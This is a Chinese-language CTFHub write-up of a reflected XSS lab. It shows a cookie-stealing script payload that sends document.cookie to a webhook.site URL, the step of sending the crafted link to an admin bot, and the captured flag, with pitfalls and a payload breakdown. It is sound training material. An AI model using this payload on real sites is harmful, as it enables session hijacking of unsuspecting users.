【CTFHub】Web-反射型XSS Writeup

操作者：何芊宏 | 操作日期：2026.9.21 | 分类：CTF | 标签：CTFHub, Web, XSS, 反射型, Webhook

1. 题目信息

  • 平台：CTFHub
  • 分类：Web - XSS / 反射型
  • 题目名称：反射型
  • 提示：页面提供一个注入点和一个“Send URL to Bot”功能。目标是通过触发XSS漏洞，窃取机器人（模拟管理员）的Cookie。

2. 解题思路

反射型XSS的核心在于：服务器未对用户输入进行过滤，将恶意代码原封不动地“反射”回浏览器并执行。由于目标Flag存储在Bot的Cookie中，需采用 OOB（带外数据） 技术。借助在线工具 Webhook.site 搭建“收件箱”，构造恶意的URL链接，诱导Bot访问，将Cookie外带。

另：反射型XSS就像“传声筒”，你对着传声筒说了一句坏话，它原封不动地传给了后面的人执行。而Webhook就是一个“信箱”，用来接收Bot偷偷扔过来的信件。

3. 操作步骤

第一步：漏洞探测

在 What's your name 输入框输入基础测试Payload：

<script>alert(1)</script>

点击Submit，页面成功弹窗。说明服务器未做任何过滤，反射型XSS漏洞存在。

第二步：搭建“收件箱”

访问 https://webhook.site，获取专属的唯一URL，例如：

https://webhook.site/44f4f857-1f6f-4e34-bde8-2b92b25b7689

第三步：构造外带Payload

在靶场的输入框中，注入以下代码（注意需将URL替换为你的专属地址），利用生成隐形图片的方式发起请求：

<script>new Image().src='https://webhook.site/44f4f857-1f6f-4e34-bde8-2b92b25b7689/?cookie='+document.cookie;</script>

点击Submit后，复制浏览器地址栏生成的完整长URL（包含已编码的恶意参数）。

第四步：诱导Bot触发

将地址栏复制出的靶场长URL，粘贴到页面底部的 Send URL to Bot 输入框中，点击Send。页面提示 Successfully。

第五步：捕获Flag

返回Webhook.site页面，等待数秒，在左侧INBOX中查看收到的新请求。在 Query strings 中发现 cookie 参数，获取到Flag：

ctfhub{1806f8647948d77a2532d24b}

提交至CTFHub，通关成功。

4. 踩坑记录与复盘

  • 坑1：URL锚点导致参数丢失。复制Webhook地址时，直接复制了带 #!/view/ 的浏览器页面地址。# 在HTTP请求中只作前端锚点，浏览器不会发送 # 后面的内容，会导致参数被截断。需手动去掉 #!/view/，只保留纯净的专属ID。
  • 坑2：机器人不接收代码。尝试将Payload直接粘贴进 Send URL to Bot 中触发系统报错 Not Match...。Bot接收的是合法的 http(s) 网址，而不是代码本身。我们需要把Payload注入输入框，然后复制整个靶场页面生成的网址发送给Bot。
  • 坑3：视角错位，误以为失败。在发送给Bot前，一直手动刷新Webhook页面，看见 No default content 以为工具无效。Webhook是“接收端”，只有“发送端”（Bot）执行后，它才会显示数据。应盯紧Send后的页面状态。

5. 知识总结

  • 反射型XSS与OOB：反射型XSS需要受害者主动访问带有恶意参数的URL。当目标是无回显的盲打场景时，需要利用外部服务器（如Webhook）接收带外数据（OOB）。
  • 外带Payload的代码结构拆解：
    我们成功外带的Payload为：<script>new Image().src='https://webhook.site/.../?cookie='+document.cookie;</script>
    我们将其拆解为四个部分来理解：
    1. 执行入口：<script>...</script>。告诉浏览器“这里面不是普通文字，是JavaScript代码，请直接运行”。
    2. 隐蔽外发通道：new Image()。在内存中创建一个隐形图片，用户看不到。设置它的 .src 属性时，浏览器为了加载这张图，会悄悄向指定的网址发起一个网络请求（GET请求）。
    3. 拼接目标数据：+document.cookie。这是JavaScript的内置功能，用来读取当前浏览器在该网站下的Cookie（里面包含了Flag）。加号 + 用于把前面的网址和这个Cookie数据拼接成完整的URL字符串。
    4. 数据接收端：'https://webhook.site/.../?cookie='。这是我们在Webhook搭建的“信箱”地址，成功接收到请求后，就可在其后台看到以 ?cookie= 为参数名外带出来的数据。
  • XSS漏洞验证流程：输入测试字符 -> 观察回显位置 -> F12检查HTML源码 -> 测试弹窗Payload -> 确认过滤机制。
